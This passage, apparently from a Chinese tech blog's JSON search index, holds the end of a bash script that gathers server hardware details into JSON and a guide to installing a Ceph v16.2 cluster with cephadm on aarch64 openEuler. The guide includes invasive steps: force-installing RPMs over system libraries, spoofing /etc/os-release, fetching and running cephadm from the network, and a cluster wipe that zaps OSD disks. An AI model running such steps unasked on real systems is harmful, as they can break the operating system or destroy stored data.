$(echo \u0026#34;$mem_info_1\u0026#34;) do local locator=$(echo $line |awk -F , \u0026#39;{print $1}\u0026#39;) local sn=$(echo $line |awk -F , \u0026#39;{print $3}\u0026#39;) local size=$(echo $line |awk -F , \u0026#39;{print $2}\u0026#39;) local mem1=$(create_json \u0026#34;locator\u0026#34; \u0026#34;$locator\u0026#34;) local mem2=$(create_json \u0026#34;sn\u0026#34; \u0026#34;$sn\u0026#34;) local mem3=$(create_json \u0026#34;size\u0026#34; \u0026#34;$size\u0026#34;) local mem4=$(jq -n \u0026#34;$mem1 + $mem2 + $mem3\u0026#34;) #每条内存的信息，key是内存从0开始的序号 local mem=$(create_json \u0026#34;mem_$i\u0026#34; \u0026#34;$mem4\u0026#34;) #将这些内存的信息组合到一个json中 mem_info=$(jq -n \u0026#34;$mem_info + $mem\u0026#34;) i=$[ $i + 1 ] done #给这些内存的信息设置key，mem local info=$(create_json \u0026#34;mem\u0026#34; \u0026#34;$mem_info\u0026#34;) INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) return 0 } function get_megacli_disk() { #设置megacli工具的路径，此条可以根据情况更改 local raid_tool=\u0026#34;/opt/MegaRAID/MegaCli/MegaCli64\u0026#34; #将硬盘信息获取，保存下来，省去每次都执行的操作 $raid_tool pdlist aall \u0026gt;/tmp/megacli_pdlist.txt local disk_info=\u0026#34;{}\u0026#34; #获取硬盘的必要信息 local disk_info_1=$(cat /tmp/megacli_pdlist.txt |egrep \u0026#39;Enclosure Device ID:|Slot Number:|PD Type:|Raw Size:|Inquiry Data:|Media Type:\u0026#39;|awk \u0026#39; { if(NR%6==1 \u0026amp;\u0026amp; $1$2==\u0026#34;EnclosureDevice\u0026#34;) { E=$NF; getline (NR+1); S=$NF; getline (NR+2); pdtype=$NF; getline (NR+3); size=$3$4; getline (NR+4); sn=$3$4$5$6; getline (NR+5); mediatype=$3$4$5$6; printf(\u0026#34;%s,%s,%s,%s,%s,%s\\n\u0026#34;,E,S,pdtype,size,sn,mediatype) } }\u0026#39;) #将获取到的硬盘信息进行整合，生成json local i=0 for line in $(echo $disk_info_1) do #local key=$(echo $line |awk -F , \u0026#39;{printf(\u0026#34;ES%s_%s\\n\u0026#34;,$1,$2)}\u0026#39;) local E=$(echo $line |awk -F , \u0026#39;{print $1}\u0026#39;) local S=$(echo $line |awk -F , \u0026#39;{print $2}\u0026#39;) local pdtype=$(echo $line |awk -F , \u0026#39;{print $3}\u0026#39;) local size=$(echo $line |awk -F , \u0026#39;{print $4}\u0026#39;) local sn=$(echo $line |awk -F , \u0026#39;{print $5}\u0026#39;) local mediatype=$(echo $line |awk -F , \u0026#39;{print $6}\u0026#39;) local disk1=$(create_json \u0026#34;pdtype\u0026#34; \u0026#34;$pdtype\u0026#34;) local disk1_1=$(create_json \u0026#34;enclosure_id\u0026#34; \u0026#34;$E\u0026#34;) local disk1_2=$(create_json \u0026#34;slot_id\u0026#34; \u0026#34;$S\u0026#34;) local disk2=$(create_json \u0026#34;size\u0026#34; \u0026#34;$size\u0026#34;) local disk3=$(create_json \u0026#34;sn\u0026#34; \u0026#34;$sn\u0026#34;) local disk4=$(create_json \u0026#34;mediatype\u0026#34; \u0026#34;$mediatype\u0026#34;) local disk5=$(jq -n \u0026#34;$disk1 + $disk1_1 + $disk1_2 + $disk2 + $disk3 + $disk4\u0026#34;) local disk=$(create_json \u0026#34;disk_$i\u0026#34; \u0026#34;$disk5\u0026#34;) disk_info=$(jq -n \u0026#34;$disk_info + $disk\u0026#34;) i=$[ $i + 1 ] done #echo $disk_info local info=$(create_json \u0026#34;disk\u0026#34; \u0026#34;$disk_info\u0026#34;) INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) return 0 } function get_hba_disk() { #对于hba卡的硬盘，使用smartctl获取硬盘信息 local disk_tool=\u0026#34;smartctl\u0026#34; local disk_info=\u0026#34;{}\u0026#34; #lsscsi 需要使用yum install lsscsi 安装 local disk_info_1=$(lsscsi -g |grep -v \u0026#39;enclosu\u0026#39; |awk \u0026#39;{printf(\u0026#34;%s,%s,%s,%s\\n\u0026#34;,$1,$2,$(NF-1),$NF)}\u0026#39;) local i=0 for line in $(echo $disk_info_1) do local E=$(echo $line |awk -F , \u0026#39;{print $1}\u0026#39; |awk -F \u0026#39;:\u0026#39; \u0026#39;{print $1}\u0026#39; |tr -d \u0026#39;\\[|\\]\u0026#39;) local S=$(echo $line |awk -F , \u0026#39;{print $NF}\u0026#39; |egrep -o [0-9]*) local sd=$(echo $line |awk -F , \u0026#39;{print $(NF-1)}\u0026#39;) $disk_tool -i $sd \u0026gt;/tmp/disk_info.txt local pdtype=\u0026#34;SATA\u0026#34; if [ \u0026#34;$(cat /tmp/disk_info.txt |grep \u0026#39;Transport protocol:\u0026#39; |awk \u0026#39;{print $NF}\u0026#39;)\u0026#34; == \u0026#34;SAS\u0026#34; ] then local pdtype=\u0026#34;SAS\u0026#34; fi local size=$(cat /tmp/disk_info.txt |grep \u0026#39;User Capacity:\u0026#39; |awk \u0026#39;{printf(\u0026#34;%s%s\\n\u0026#34;,$(NF-1),$NF)}\u0026#39; |tr -d \u0026#39;\\[|\\]\u0026#39;) local sn=$(cat /tmp/disk_info.txt |grep \u0026#39;Serial Number:\u0026#39; |awk \u0026#39;{print $NF}\u0026#39;) local mediatype=\u0026#34;disk\u0026#34; local disk1=$(create_json \u0026#34;pdtype\u0026#34; \u0026#34;$pdtype\u0026#34;) local disk1_1=$(create_json \u0026#34;enclosure_id\u0026#34; \u0026#34;$E\u0026#34;) local disk1_2=$(create_json \u0026#34;slot_id\u0026#34; \u0026#34;$S\u0026#34;) local disk2=$(create_json \u0026#34;size\u0026#34; \u0026#34;$size\u0026#34;) local disk3=$(create_json \u0026#34;sn\u0026#34; \u0026#34;$sn\u0026#34;) local disk4=$(create_json \u0026#34;mediatype\u0026#34; \u0026#34;$mediatype\u0026#34;) local disk5=$(jq -n \u0026#34;$disk1 + $disk1_1 + $disk1_2 + $disk2 + $disk3 + $disk4\u0026#34;) local disk=$(create_json \u0026#34;disk_$i\u0026#34; \u0026#34;$disk5\u0026#34;) disk_info=$(jq -n \u0026#34;$disk_info + $disk\u0026#34;) i=$[ $i + 1 ] done #echo $disk_info local info=$(create_json \u0026#34;disk\u0026#34; \u0026#34;$disk_info\u0026#34;) INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) return 0 } function get_disk() { #根据获取到的硬盘控制器类型，来判断使用什么工具采集硬盘信息 if [ \u0026#34;$(echo \u0026#34;$INFO\u0026#34; |jq -r .disk_ctrl.disk_ctrl_0.type)\u0026#34; == \u0026#34;raid\u0026#34; ] then get_megacli_disk elif [ \u0026#34;$(echo \u0026#34;$INFO\u0026#34; |jq -r .disk_ctrl.disk_ctrl_0.type)\u0026#34; == \u0026#34;hba\u0026#34; ] then get_hba_disk else local info=$(create_json \u0026#34;disk\u0026#34; \u0026#34;error\u0026#34;) INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) fi #hp机器比较特殊，这里我没有做hp机器硬盘信息采集，有兴趣的朋友可以自行添加上 #if hp machine return 0 } function get_diskController() { local disk_ctrl=\u0026#34;{}\u0026#34; #if LSI Controller local disk_ctrl_1=\u0026#34;$(lspci -nn |grep LSI)\u0026#34; local i=0 #以换行符分隔 IFS_OLD=$IFS \u0026amp;\u0026amp; IFS=$\u0026#39;\\n\u0026#39; for line in $(echo \u0026#34;$disk_ctrl_1\u0026#34;) do #echo $line local ctrl_id=$(echo \u0026#34;$line\u0026#34; |awk -F \u0026#39;]:\u0026#39; \u0026#39;{print $1}\u0026#39; |awk \u0026#39;{print $NF}\u0026#39; |tr -d \u0026#39;\\[|\\]\u0026#39;) case \u0026#34;$ctrl_id\u0026#34; in #根据控制器的id或进行判断是raid卡还是hba卡，因为品牌比较多，后续可以在此处进行扩展添加 0104) # 获取Logic以后的字符串，并进行拼接 local ctrl_name=$(echo \u0026#34;${line##*\u0026#34;Logic\u0026#34;}\u0026#34; |awk \u0026#39;{printf(\u0026#34;%s_%s_%s\\n\u0026#34;,$1,$2,$3)}\u0026#39;) local ctrl1=$(create_json \u0026#34;id\u0026#34; \u0026#34;$ctrl_id\u0026#34;) local ctrl2=$(create_json \u0026#34;type\u0026#34; \u0026#34;raid\u0026#34;) local ctrl3=$(create_json \u0026#34;name\u0026#34; \u0026#34;$ctrl_name\u0026#34;) ;; 0100|0107) local ctrl_name=$(echo \u0026#34;${line##*\u0026#34;Logic\u0026#34;}\u0026#34; |awk \u0026#39;{printf(\u0026#34;%s_%s_%s\\n\u0026#34;,$1,$3,$4)}\u0026#39;) local ctrl1=$(create_json \u0026#34;id\u0026#34; \u0026#34;$ctrl_id\u0026#34;) local ctrl2=$(create_json \u0026#34;type\u0026#34; \u0026#34;hba\u0026#34;) local ctrl3=$(create_json \u0026#34;name\u0026#34; \u0026#34;$ctrl_name\u0026#34;) ;; *) local ctrl1=$(create_json \u0026#34;id\u0026#34; \u0026#34;----\u0026#34;) local ctrl2=$(create_json \u0026#34;type\u0026#34; \u0026#34;----\u0026#34;) local ctrl3=$(create_json \u0026#34;name\u0026#34; \u0026#34;----\u0026#34;) ;; esac local ctrl_tmp=$(jq -n \u0026#34;$ctrl1 + $ctrl2 + $ctrl3\u0026#34;) local ctrl=$(create_json \u0026#34;disk_ctrl_$i\u0026#34; \u0026#34;$ctrl_tmp\u0026#34;) disk_ctrl=$(jq -n \u0026#34;$disk_ctrl + $ctrl\u0026#34;) i=$[ $i + 1 ] done IFS=$IFS_OLD local info=$(create_json \u0026#34;disk_ctrl\u0026#34; \u0026#34;$disk_ctrl\u0026#34;) INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) return 0 } function get_netcard() { local netcard_info=\u0026#34;{}\u0026#34; local netcard_info_1=\u0026#34;$(lspci -nn |grep Ether)\u0026#34; local i=0 #echo \u0026#34;$netcard_info_1\u0026#34; IFS_OLD=$IFS \u0026amp;\u0026amp; IFS=$\u0026#39;\\n\u0026#39; for line in $(echo \u0026#34;$netcard_info_1\u0026#34;) do local net_id=$(echo $line |egrep -o \u0026#39;[0-9a-z]{4}:[0-9a-z]{4}\u0026#39;) local net_id_1=$(echo $net_id |awk -F : \u0026#39;{print $1}\u0026#39;) case \u0026#34;$net_id_1\u0026#34; in 8086) local net_name=$(echo \u0026#34;${line##*\u0026#34;: \u0026#34;}\u0026#34; |awk \u0026#39;{printf(\u0026#34;%s_%s_%s_%s\\n\u0026#34;,$1,$3,$4,$5)}\u0026#39;) local type=$(echo $line |egrep -o SFP || echo \u0026#34;TP\u0026#34;) local net1=$(create_json \u0026#34;id\u0026#34; \u0026#34;$net_id\u0026#34;) local net2=$(create_json \u0026#34;name\u0026#34; \u0026#34;$net_name\u0026#34;) local net3=$(create_json \u0026#34;type\u0026#34; \u0026#34;$type\u0026#34;) ;; 14e4) local net_name=$(echo \u0026#34;${line##*\u0026#34;: \u0026#34;}\u0026#34; |awk \u0026#39;{printf(\u0026#34;%s_%s_%s_%s\\n\u0026#34;,$1,$3,$4,$5)}\u0026#39;) local type=$(echo $line |egrep -o SFP || echo \u0026#34;TP\u0026#34;) local net1=$(create_json \u0026#34;id\u0026#34; \u0026#34;$net_id\u0026#34;) local net2=$(create_json \u0026#34;name\u0026#34; \u0026#34;$net_name\u0026#34;) local net3=$(create_json \u0026#34;type\u0026#34; \u0026#34;$type\u0026#34;) ;; *) local net_name=$(echo \u0026#34;${line##*\u0026#34;: \u0026#34;}\u0026#34; |awk \u0026#39;{printf(\u0026#34;%s_%s_%s_%s\\n\u0026#34;,$1,$3,$4,$5)}\u0026#39;) local type=$(echo $line |egrep -o SFP || echo \u0026#34;TP\u0026#34;) local net1=$(create_json \u0026#34;id\u0026#34; \u0026#34;$net_id\u0026#34;) local net2=$(create_json \u0026#34;name\u0026#34; \u0026#34;$net_name\u0026#34;) local net3=$(create_json \u0026#34;type\u0026#34; \u0026#34;$type\u0026#34;) ;; esac local net1=$(jq -n \u0026#34;$net1 + $net2 + $net3\u0026#34;) #echo $net local net2=$(create_json \u0026#34;net_$i\u0026#34; \u0026#34;$net1\u0026#34;) netcard_info=$(jq -n \u0026#34;$netcard_info + $net2\u0026#34;) i=$[ $i + 1 ] done IFS=$IFS_OLD local info=$(create_json \u0026#34;net\u0026#34; \u0026#34;$netcard_info\u0026#34;) INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) return 0 } function get_server() { local product=$(dmidecode -s system-product-name |grep -v \u0026#39;^#\u0026#39; |tr -d \u0026#39; \u0026#39; |head -n1) local manufacturer=$(dmidecode -s system-manufacturer |grep -v \u0026#39;^#\u0026#39; |tr -d \u0026#39; \u0026#39; |head -n1) local server1=$(create_json \u0026#34;manufacturer\u0026#34; \u0026#34;$manufacturer\u0026#34;) local server2=$(create_json \u0026#34;product\u0026#34; \u0026#34;$product\u0026#34;) local server3=$(jq -n \u0026#34;$server1 + $server2\u0026#34;) local info=$(create_json \u0026#34;basic_info\u0026#34; \u0026#34;$server3\u0026#34;) INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) return 0 } ALL_INFO=\u0026#34;\u0026#34; function get_all() { #因为硬盘信息的获取依赖硬盘控制器的信息，所以get_diskController要放到get_disk前面 get_server get_cpu get_mem get_diskController get_disk get_netcard local sn=$(dmidecode -s system-serial-number |grep -v \u0026#39;^#\u0026#39; |tr -d \u0026#39; \u0026#39; |head -n1) ALL_INFO=$(create_json \u0026#34;$sn\u0026#34; \u0026#34;$INFO\u0026#34;) return 0 } function main() { get_all echo $ALL_INFO return 0 } #------------------------------------------------- main ","permalink":"https://www.lvbibir.cn/posts/tech/shell_get_server_hardware_information/","summary":"前言 查看硬件信息，并将信息整合成json数值，然后传给前段进行分析，最后再进行相应的处理。在装系统的时候，或是进行监控时，都是一个标准的自动","title":"获取服务器硬件信息（整合为json格式）"},{"content":"前言 ceph：v16.2（pacific）\n操作系统：icloudos_v1.0_aarch64（openEuler-20.03-LTS-aarch64）\n内核版本：4.19.90-2003.4.0.0037.aarch64\n集群角色：\nip 主机名 角色 192.168.47.133 ceph-aarch64-node1 cephadm，mgr，mon，osd 192.168.47.135 ceph-aarch64-node2 osd 192.168.47.130 ceph-aarch64-node3 osd 环境配置(所有节点) 关闭 node_exporter systemctl stop node_exporter systemctl disable node_exporter 修改主机名 hostnamectl set-hostname ceph-aarch64-node1 hostnamectl set-hostname ceph-aarch64-node2 hostnamectl set-hostname ceph-aarch64-node3 vi /etc/hosts # 添加 192.168.47.133 ceph-aarch64-node1 192.168.47.135 ceph-aarch64-node2 192.168.47.130 ceph-aarch64-node3 添加 yum 源 wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sed -i \u0026#39;s/$releasever/8/g\u0026#39; /etc/yum.repos.d/docker-ce.repo 添加 epel 源 yum install epel-release # 修改 $releasever sed -i \u0026#39;s/$releasever/8/g\u0026#39; /etc/yum.repos.d/epel-modular.repo sed -i \u0026#39;s/$releasever/8/g\u0026#39; /etc/yum.repos.d/epel-playground.repo sed -i \u0026#39;s/$releasever/8/g\u0026#39; /etc/yum.repos.d/epel.repo sed -i \u0026#39;s/$releasever/8/g\u0026#39; /etc/yum.repos.d/epel-testing-modular.repo sed -i \u0026#39;s/$releasever/8/g\u0026#39; /etc/yum.repos.d/epel-testing.repo 修改 /etc/os-release sed -i \u0026#39;s/ID=\u0026#34;isoft\u0026#34;/ID=\u0026#34;centos\u0026#34;/g\u0026#39; /etc/os-release sed -i \u0026#39;s/VERSION_ID=\u0026#34;1.0\u0026#34;/VERSION_ID=\u0026#34;8.0\u0026#34;/g\u0026#39; /etc/os-release 安装 python3.6 yum install python3-pip-wheel python3-setuptools-wheel wget http://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/aarch64/os/Packages/python3-libs-3.6.8-41.el8.aarch64.rpm wget http://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/aarch64/os/Packages/libffi-3.1-22.el8.aarch64.rpm rpm -ivh libffi-3.1-22.el8.aarch64.rpm --force cp /usr/lib64/libpython3.so /usr/lib64/libpython3.so-3.7.4 rpm -ivh python3-libs-3.6.8-41.el8.aarch64.rpm --force --nodeps mv /lib64/libpython3.so /lib64/python3.so-3.6.8 ln -s /usr/lib64/libpython3.so /lib64/libpython3.so yum install platform-python yum install python3-pip-9.0.3-20.el8.noarch vim /usr/bin/yum # 将 #!/usr/bin/python3 改成 #!/usr/bin/python3.7 yum install python3-prettytable-0.7.2-14.el8 yum install python3-gobject-base-3.28.3-2.el8.aarch64 yum install firewalld-0.9.3-7.el8 安装 docker yum install docker-ce systemctl start docker systemctl status docker systemctl enable docker 安装ceph 安装 cephadm \u0026amp; ceph-common curl --silent --remote-name --location https://github.com/ceph/ceph/raw/pacific/src/cephadm/cephadm chmod +x cephadm ./cephadm add-repo --release pacific yum install -y cephadm which cephadm # /usr/sbin/cephadm yum install ceph-common-16.2.9-0.el8 ceph 集群初始化 cephadm bootstrap --mon-ip 192.168.47.133 访问：https://192.168.47.133:8443/\n第一次访问 dashboard 需要修改初始账号密码\n添加主机 ceph orch host add ceph-aarch64-node2 192.168.47.135 --labels _admin ceph orch host add ceph-aarch64-node3 192.168.47.130 --labels _admin ceph orch apply osd --all-available-devices 清除ceph集群 # 暂停集群，避免部署新的 ceph 守护进程 ceph orch pause # 验证集群 fsid ceph fsid # 清除集群所有主机的 ceph 守护进程 cephadm rm-cluster --force --zap-osds --fsid \u0026lt;fsid\u0026gt; 故障问题 no active mgr cephadm ls cephadm run --name mgr.ceph-aarch64-node3.ipgtzj --fsid 17136806-0735-11ed-9c4f-52546f3387f3 ceph orch apply mgr label:_admin ","permalink":"https://www.lvbibir.cn/posts/ceph_v16.2_cpehadm/","summary":"前言 ceph：v16.2（pacific） 操作系统：icloudos_v1.0_aarch64（openEuler-20.03-LTS-aa","title":""}]